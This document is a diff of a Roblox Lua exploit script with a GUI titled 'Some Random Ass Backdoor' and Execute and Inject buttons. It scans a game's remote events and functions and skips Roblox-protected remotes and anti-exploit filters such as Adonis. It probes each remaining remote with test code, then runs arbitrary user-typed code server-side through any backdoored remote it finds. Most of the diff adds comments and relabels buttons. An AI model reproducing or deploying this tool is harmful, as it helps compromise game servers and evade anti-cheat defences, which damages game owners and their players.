@@ -1,3 +1,7 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
@@ -9,6 +13,7 @@ local TextButton_2 = Instance.new("TextButton")
 local TextButton_3 = Instance.new("TextButton")
 local TextButton_4 = Instance.new("TextButton")
 
+--Properties:
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
@@ -30,7 +35,7 @@ TextLabel.BorderSizePixel = 0
 TextLabel.Position = UDim2.new(0.144262299, 0, 0, 0)
 TextLabel.Size = UDim2.new(0, 252, 0, 50)
 TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "Random Ass Backdoor"
+TextLabel.Text = "Some Random Ass Backdoor"
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.TextSize = 25.000
 TextLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -48,13 +53,12 @@ TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextButton.BackgroundTransparency = 1.000
 TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextButton.BorderSizePixel = 0
-TextButton.Position = UDim2.new(0.885245919, 0, 0, 0)
-TextButton.Size = UDim2.new(0, 35, 0, 35)
+TextButton.Position = UDim2.new(0.934426248, 0, 0, 0)
+TextButton.Size = UDim2.new(0, 20, 0, 20)
 TextButton.Font = Enum.Font.SourceSans
 TextButton.Text = "x"
 TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
-TextButton.TextSize = 30.000
-TextButton.TextYAlignment = Enum.TextYAlignment.Top
+TextButton.TextSize = 20.000
 
 TextBox.Parent = Frame
 TextBox.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
@@ -64,7 +68,7 @@ TextBox.BorderSizePixel = 0
 TextBox.Position = UDim2.new(0.321311474, 0, 0.270270258, 0)
 TextBox.Size = UDim2.new(0, 198, 0, 124)
 TextBox.Font = Enum.Font.SourceSans
-TextBox.Text = "Discord: envysplague"
+TextBox.Text = ""
 TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextBox.TextSize = 14.000
 TextBox.TextXAlignment = Enum.TextXAlignment.Left
@@ -103,7 +107,8 @@ TextButton_4.Text = "Inject"
 TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_4.TextSize = 20.000
 
-local function CMNE_fake_script()
+-- Scripts:
+local function CMNE_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	local frame = script.Parent
@@ -149,10 +154,10 @@ local function CMNE_fake_script()
 			update(input)
 		end
 	end)
+	
 end
 coroutine.wrap(CMNE_fake_script)()
-
-local function TJOAR_fake_script()
+local function TJOAR_fake_script() -- TextLabel.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	local textLabel = script.Parent
@@ -166,25 +171,27 @@ local function TJOAR_fake_script()
 		textLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
 		task.wait(0.03)
 	end
+	
 end
 coroutine.wrap(TJOAR_fake_script)()
-
-local function OXSJLE_fake_script()
+local function OXSJLE_fake_script() -- ImageLabel.LocalScript 
 	local script = Instance.new('LocalScript', ImageLabel)
 
 	local Players = game:GetService("Players")
 	local player = Players.LocalPlayer
 	
+	-- Find the ImageLabel (assumes this script is parented to the Frame)
 	local imageLabel = script.Parent.Parent.ImageLabel
 	if imageLabel and player then
 		local userId = player.UserId
+		-- Use the "avatar" endpoint with type=bust for a less close-up image (shows upper body)
 		local thumbnailUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png&type=bust"
 		imageLabel.Image = thumbnailUrl
 	end
+	
 end
 coroutine.wrap(OXSJLE_fake_script)()
-
-local function CYSQ_fake_script()
+local function CYSQ_fake_script() -- TextButton.LocalScript 
 	local script = Instance.new('LocalScript', TextButton)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -192,8 +199,7 @@ local function CYSQ_fake_script()
 	end)
 end
 coroutine.wrap(CYSQ_fake_script)()
-
-local function EECD_fake_script()
+local function EECD_fake_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	local textLabel = script.Parent
@@ -207,10 +213,10 @@ local function EECD_fake_script()
 		textLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
 		task.wait(0.03)
 	end
+	
 end
 coroutine.wrap(EECD_fake_script)()
-
-local function QCDVZYD_fake_script()
+local function QCDVZYD_fake_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	local textBox = script.Parent
@@ -224,6 +230,8 @@ local function QCDVZYD_fake_script()
 	local function onInputBegan(input, gameProcessed)
 		if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Return then
 			textBox:ReleaseFocus()
+			-- Optionally prevent newline from being added
+			-- textBox.Text = textBox.Text:gsub("\n", "")
 		end
 	end
 	
@@ -237,10 +245,10 @@ local function QCDVZYD_fake_script()
 			inputConn = nil
 		end
 	end)
+	
 end
 coroutine.wrap(QCDVZYD_fake_script)()
-
-local function RTFJLUK_fake_script()
+local function RTFJLUK_fake_script() -- TextButton_2.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_2)
 
 	local textLabel = script.Parent
@@ -254,10 +262,10 @@ local function RTFJLUK_fake_script()
 		textLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
 		task.wait(0.03)
 	end
+	
 end
 coroutine.wrap(RTFJLUK_fake_script)()
-
-local function CYAU_fake_script()
+local function CYAU_fake_script() -- TextButton_3.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_3)
 
 	local textLabel = script.Parent
@@ -271,10 +279,10 @@ local function CYAU_fake_script()
 		textLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
 		task.wait(0.03)
 	end
+	
 end
 coroutine.wrap(CYAU_fake_script)()
-
-local function FYCZ_fake_script()
+local function FYCZ_fake_script() -- TextButton_4.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_4)
 
 	local textLabel = script.Parent
@@ -288,9 +296,11 @@ local function FYCZ_fake_script()
 		textLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
 		task.wait(0.03)
 	end
+	
 end
 coroutine.wrap(FYCZ_fake_script)()
 
+-- Backdoor Functionality
 local function setupBackdoorFunctionality()
     local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
     local backdoor = nil
@@ -337,6 +347,7 @@ local function setupBackdoorFunctionality()
         local remotes = {}
         local code
         
+        -- Check for protected backdoor first
         local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
         if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
             while true do
@@ -349,9 +360,11 @@ local function setupBackdoorFunctionality()
             remotes[code] = protected_backdoor
         end
         
+        -- Scan all remotes in the game
         for _, remote in game:GetDescendants() do
             if not (remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction')) then continue end
             
+            -- Skip certain protected remotes
             if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
                 debug('Roblox Replicated Storage ('..remote.Name..')', 1)
                 continue
@@ -361,6 +374,7 @@ local function setupBackdoorFunctionality()
                remote.Parent.Parent == game:GetService("ReplicatedStorage") or 
                remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage") then
                 
+                -- Skip known anti-exploit systems
                 if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
                     debug('Adonis filter detected ('..remote.Name..')', 1)
                     continue
@@ -377,6 +391,7 @@ local function setupBackdoorFunctionality()
                 end
             end
             
+            -- Test the remote
             while true do
                 code = generateName(math.random(12,30))
                 if not remotes[code] then break end
@@ -387,6 +402,7 @@ local function setupBackdoorFunctionality()
             debug('Tested remote "'..remote:GetFullName()..'"', 1)
         end
         
+        -- Check which remotes worked
         for i = 1, 100 do
             for code, remote in pairs(remotes) do
                 if workspace:FindFirstChild(code) then
@@ -394,7 +410,8 @@ local function setupBackdoorFunctionality()
                     backdoor = remote
                     debug(remote:GetFullName(), 3)
                     
-                    runRemote(remote, "a=Instance.new('Hint')a.Text='T3ST ON TOP !Discord: envysplague'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+                    -- Create visual indicator
+                    runRemote(remote, "a=Instance.new('Hint')a.Text='Backdoor Scanner | Found backdoor'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                     
                     return true
                 end
@@ -405,6 +422,7 @@ local function setupBackdoorFunctionality()
         return false
     end
 
+    -- Button functionality
     TextButton_2.MouseButton1Click:Connect(function()
         local scriptText = TextBox.Text
         if backdoor then
@@ -430,15 +448,16 @@ local function setupBackdoorFunctionality()
             debug('Scanning for backdoors...', 3)
             TextButton_4.Text = "Scanning..."
             if not findRemote() then
-                TextButton_4.Text = "Failure"
+                TextButton_4.Text = "No backdoor :("
                 searching = false
             else
-                TextButton_4.Text = "Injected"
+                TextButton_4.Text = "Found backdoor!"
                 searching = false
             end
         end
     end)
 
+    -- Toggle GUI with Alt key
     game:GetService('UserInputService').InputBegan:Connect(function(input, processed)
         if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then
             Frame.Visible = not Frame.Visible
@@ -446,4 +465,5 @@ local function setupBackdoorFunctionality()
     end)
 end
 
+-- Initialize the backdoor functionality
 setupBackdoorFunctionality()
